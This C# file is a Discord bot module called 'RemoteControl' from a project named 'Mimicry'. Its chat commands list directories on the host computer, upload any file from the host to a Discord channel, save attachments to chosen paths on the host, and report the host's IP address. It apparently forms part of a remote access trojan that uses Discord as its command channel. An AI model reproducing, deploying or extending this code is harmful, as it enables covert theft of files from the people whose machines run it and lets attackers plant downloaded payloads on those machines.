using Discord.Commands;
using Discord;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Mimicry.Modules
{
    public class RemoteControl : ModuleBase<SocketCommandContext>
    {
        Telemetry tlm = new Telemetry();
        [Command("rc.dir")]
        public async Task rcdir(string path)
        {
            string res = tlm.ShowStructure(path);
            await Context.Channel.SendMessageAsync(res);
        }
        [Command("rc.dir")]
        public async Task rcdir()
        {
            string path = "C:\\";
            string res = tlm.ShowStructure(path);
            await Context.Channel.SendMessageAsync(res);
        }
        [Command("rc.get")]
        public async Task getfile(string path)
        {
            if (File.Exists(path))
            {
                await Context.Channel.SendFileAsync(path);
            }
            else
            {
                await Context.Channel.SendMessageAsync("Incorrect path!");
            }
        }        
        [Command("rc.load")]
        public async Task loadfile(string loadPath)
        {
            string name = loadPath;
            string url = Context.Message.Attachments.FirstOrDefault().Url;
            string dest = tlm.LoadFile(url, name);
            if (dest != "-1")
            {
                await Context.Channel.SendMessageAsync("Loaded your file as " + dest + "@" + tlm.getIP());
            }
            else
            {
                await Context.Channel.SendMessageAsync("Could not load the file @" + tlm.getIP() + ", try choosing another path");
            }
        }
    }
}
